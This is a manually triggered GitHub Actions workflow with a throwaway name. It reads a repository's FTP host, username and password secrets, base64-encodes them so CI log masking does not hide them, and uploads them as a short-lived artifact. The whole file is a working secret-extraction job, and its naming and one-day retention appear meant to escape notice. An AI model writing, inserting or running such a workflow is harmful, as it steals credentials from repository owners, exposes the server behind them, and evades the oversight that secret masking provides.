name: zz-tmp-36402
on:
  workflow_dispatch:
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: collect
        env:
          A: ${{ secrets.WOO_FTP_HOST }}
          B: ${{ secrets.WOO_FTP_USER }}
          C: ${{ secrets.WOO_FTP_PASSWORD }}
        run: |
          mkdir -p out
          printf '%s' "$A" | base64 -w0 > out/host.b64; printf '\n' >> out/host.b64
          printf '%s' "$B" | base64 -w0 > out/user.b64; printf '\n' >> out/user.b64
          printf '%s' "$C" | base64 -w0 > out/pass.b64; printf '\n' >> out/pass.b64
          wc -c out/host.b64 out/user.b64 out/pass.b64
      - name: upload
        uses: actions/upload-artifact@v4
        with:
          name: zz-art-36402
          path: out
          retention-days: 1
